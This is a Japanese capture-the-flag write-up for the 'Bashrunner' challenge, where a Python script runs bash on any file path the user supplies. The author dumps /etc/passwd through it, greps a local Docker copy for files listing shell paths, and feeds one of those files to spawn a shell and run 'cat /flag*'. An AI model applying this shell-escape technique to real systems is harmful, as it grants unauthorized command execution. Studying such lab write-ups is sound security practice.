# Bashrunner

## / Overview

シェルを呼び出すようなスクリプトが書いているファイルを見つける。

## / Writeup

チャレンジサーバに接続すると、`jail.py`が実行されます。

内容は次のようになっています。

```python
import os

path = input("Example: hello.sh\n$ bash ")
# ファイルパスを指定しなければならない
if os.path.isfile(path):
    # pathの内容をコマンドとして実行する
    os.system(f"bash {path}")
else:
    print("File not found")
```

非常なシンプルな制約です。試しに`hello.sh`を入力してみます。

`hello.sh`の中身は次のとおりです。

```sh
echo "Welcome to Jail City"
```

結果は予想通り`Welcome to Jail City`と表示されます。この性質をうまく使ってフラグを表示させれるでしょうか？

### 任意ファイルの指定

この入力が受け付けるパスを調べます。試しに`/etc/passwd`を入力すると次の様な結果が得られます。

```sh
$ bash /etc/passwd
/etc/passwd: line 1: root:x:0:0:root:/root:/bin/bash: No such file or directory
/etc/passwd: line 2: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 3: bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 4: sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 5: sync:x:4:65534:sync:/bin:/bin/sync: No such file or directory
/etc/passwd: line 6: games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 7: man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 8: lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 9: mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 10: news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 11: uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 12: proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 13: www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 14: backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 15: list:x:38:38:Mailing: command not found
/etc/passwd: line 16: irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 17: _apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such file or directory
/etc/passwd: line 18: nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such file or directory
```

コマンドではないためすべての行でエラーが出ていますが、ファイル自体は読み込めています。このことから`/`以下の全てのファイルが指定できそうです。

### コマンドを探す

チャレンジサーバのファイル構成は見えませんが Docker で環境をローカルに再現することができます。`docker compose up`で環境を立ち上げます。

起動後に別のターミナルから起動中のコンテナを確認してください。
```sh
m$ docker ps -a
CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                         NAMES
<container id>   bash-runner-sandbox   "socat -T30 tcp-list…"   6 minutes ago   Up 5 minutes   0.0.0.0:1337->1337/tcp, [::]:1337->1337/tcp   bash-runner-sandbox-1
```

このコンテナに入ることで、どの様なファイルが含まれているのか調べることが出来ます。
```sh
docker exec -it <container id> /bin/bash
nobody@<container id>:/app$
```

一番嬉しいのはファイルの中にシェルを呼び出すコマンドが記述されていることです。この場合、侵入後に任意コード実行が可能になります。

シェルを呼び出す基本的なコマンドといえば
* sh
* bash
* /bin/sh
* /bin/bash
* /usr/bin/sh
* /usr/bin/bash

あたりでしょうか。コマンドに関するファイルが多そうな`/etc`, `/usr`, `/var`に絞り込みをかけて、文字列検索をしてみましょう。

```sh
nobody@<container id>:/$ grep -RInE '^\s*(sh|bash|/bin/sh|/bin/bash|/usr/bin/sh|/usr/bin/bash)$' /etc /usr /var 2> /dev/null
/etc/shells:2:/bin/sh
/etc/shells:3:/usr/bin/sh
/etc/shells:4:/bin/bash
/etc/shells:5:/usr/bin/bash
/usr/share/debianutils/shells.d/bash:1:/bin/bash
/usr/share/debianutils/shells.d/bash:3:/usr/bin/bash
/usr/share/debianutils/shells:2:/bin/sh
/var/lib/shells.state:1:/bin/sh
/var/lib/shells.state:2:/usr/bin/sh
/var/lib/shells.state:3:/bin/bash
/var/lib/shells.state:4:/usr/bin/bash
/var/lib/dpkg/info/dash.list:24:/usr/bin/sh
/var/lib/dpkg/info/bash.list:10:/usr/bin/bash
```

`grep`の説明をします。
* オプション
    `R`: 再帰的に探す
    `I`: バイナリを除外（テキストのみ）
    `n`: 行番号を表示
    `E`: 拡張正規表現を使用
* 正規表現
    `^`: 行頭
    `\s`: 空白
    `*`: 0回以上の繰り返し
    `(sh|bash|...)`: sh, bash, /bin/sh, /bin/bash などのいずれか
    `$`: 行末

つまりこのコマンドで、「`/etc`, `/usr`, `/var`以下にあるファイルの全ての行に対して、sh, bash, /bin/sh, /bin/bash などのいずれかだけが含まれている行はないか」を探しています。

### シェルを呼び出す

ここまでで`jail.py`に入力することでシェルを呼び出せそうなファイルは
* `/etc/shells`
* `/usr/share/debianutils/shells.d/bash`
* `/var/lib/shells.state`
* `/var/lib/dpkg/info/dash.list`

に絞り込むことが出来ました。

チャレンジサーバに戻って、どれでもいいので一つ入力した後に`cat /flag*`を実行するとフラグが得られます。

```sh
Example: hello.sh
$ bash /var/lib/dpkg/info/dash.list
/var/lib/dpkg/info/dash.list: line 1: /.: Is a directory
/var/lib/dpkg/info/dash.list: line 2: /usr: Is a directory
/var/lib/dpkg/info/dash.list: line 3: /usr/bin: Is a directory
cat /flag*
Alpaca{*** REDACTED ***}
```